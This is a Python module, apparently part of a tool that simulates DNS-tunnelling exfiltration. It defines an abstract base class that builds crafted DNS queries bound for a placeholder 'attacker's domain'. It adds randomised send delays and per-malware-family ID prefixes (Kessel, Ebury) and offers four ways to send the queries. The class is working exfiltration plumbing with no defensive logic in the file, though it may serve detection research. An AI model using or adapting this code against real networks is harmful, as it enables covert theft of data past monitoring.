from abc import ABC, abstractmethod
import asyncio
import random
import socket

import dns.message
import dns.name
import dns._asyncio_backend
import dns.asyncquery
import dns.asyncresolver
import dns.resolver
import dns.rrset
import dns.rdata
from faker import Faker

import datagen

MAX_QNAME_SIZE = 255
MAX_LBL_SIZE = 53

SEND_NO_WAIT = 'send_no_wait'
SEND_WAIT = 'send_wait'
SEND_RESOLVE = 'send_resolve'
SEND_GETHOST = 'send_gethost'

DNS_PORT = 53

DOMAIN = ''  # fill with attacker's domain
RECORD_TYPE = ''  # fill with queries' record type


def limit_size(func):
    def wrapper(*args, **kwargs):
        while True:
            result = func(*args, **kwargs)
            try:
                dns.name.from_text(result)
            except (dns.name.NameTooLong, dns.name.LabelTooLong):
                continue
            else:
                return result
    return wrapper


class exfil(ABC):
    '''
    Base class for exfiltration schemes that use crafted DNS queries.
    '''
    @abstractmethod
    def __init__(self, amount, time, method, resolver_addr, random_delay,
                 prepend, udp=True):
        '''
        args:
            amount: The amount of DNS queries to send.
                    Not every query transfers (whole) data.

            time: Depending on the value of 'random_delay':
                True -> The time in which the exfiltration will happen
                False -> The constant delay between each exfiltrated
                         data "chunk". Not necessarily between each
                         DNS message sent.
                In seconds.

            method: One of the 'SEND_*' constants from constants.py.
                    They correspond to the same-named methods in this class.

            resolver_addr: If using anything other than SEND_GETHOST,
                           this will be where the DNS queries will be sent to.
                           (port 53)

            random_delay: Determines the meaning of 'time'.

            domain: The domain to append to the data. In some schemes this is
                    significant as the attacker's domain where the DNS will
                    eventually relay the queries.

            record_type: The record type used in the query.

            udp: In some situations this can be used to choose
                 between udp and tcp for DNS

            prepend: If True, the domain will be prepended with a
                     vector-unique character to allow vector identification
                     in a multi-vector traffic.
                     e.g. 'domain.eu' -> 'kdomain.eu' for Kessel
                     This does not apply to Ebury which does not use domains
                     or StealthyVec, which uses its own TLDs that can be used
                     for ID.
        '''
        if prepend:
            self.domain = f"{type(self).idchar}{DOMAIN}"
        else:
            self.domain = DOMAIN
        self.record_type = RECORD_TYPE
        if not resolver_addr:
            resolver_addr = dns.resolver.Resolver().nameservers[0]
        self.resolver_addr = resolver_addr
        self.amount = amount
        if random_delay:
            self._gen = self.random_delay(time)
            self.delay = lambda: next(self._gen)
        else:
            self.delay = lambda: time
        self.udp = udp
        self.method_num = method
        self.data = Faker()
        self.custom_data = datagen.custom()

    def random_delay(self, timespan):
        '''
        Given a timespan, divides it into variable-sized chunks of timespans;
        returns agenerator that yields the sizes of these timespands.
        '''
        miliseconds = False
        if self.amount > timespan:
            miliseconds = True
            timespan *= 1000
        send_cues = sorted([random.randint(0, timespan)
                           for _ in range(self.amount - 2)])
        send_cues.append(timespan)

        def generator():
            previous_cue = 0
            for cue in send_cues:
                result = cue - previous_cue
                if miliseconds:
                    result *= 0.001
                previous_cue = cue
                yield result
            yield 0
        return generator()

    @abstractmethod
    async def call__aux(self):
        '''
        This will contain the code that gets executed for exfiltration.
        Conforming to asyncio, it can create multiple tasks and await them.
        '''
        pass

    async def __call__(self):
        backend = dns._asyncio_backend.Backend()
        if self.method_num == SEND_NO_WAIT:
            self.sock = await backend.make_socket(
                socket.AF_INET, socket.SOCK_DGRAM, 0, None,
                (self.resolver_addr, DNS_PORT))
        elif self.method_num == SEND_RESOLVE:
            self.resolver = await dns.asyncresolver.Resolver()
        self.method = self.__getattribute__(self.method_num)
        await self.call__aux()

    async def send_no_wait(self, qname):
        '''
        This method sends the DNS query with a custom QNAME
        to the designated server. Doesn't wait for a response.
        '''
        message = dns.message.make_query(qname, self.record_type)
        await dns.asyncquery.send_udp(
            self.sock, message, (self.resolver_addr, DNS_PORT))

    async def send_wait(self, qname):
        '''
        Same as 'send_no_wait' but waits for a response.
        '''
        message = dns.message.make_query(qname, self.record_type)
        if self.udp:
            await dns.asyncquery.udp(message, (self.resolver_addr, DNS_PORT))
        else:
            await dns.asyncquery.tcp(message, (self.resolver_addr, DNS_PORT))

    async def send_resolve(self, qname):
        '''
        DNSPython's resolver.
        '''
        await self.resolver.resolve(qname, self.record_type)

    # no async :(
    async def send_gethost(self, qname):
        socket.gethostbyname(qname)
        await asyncio.sleep(0)
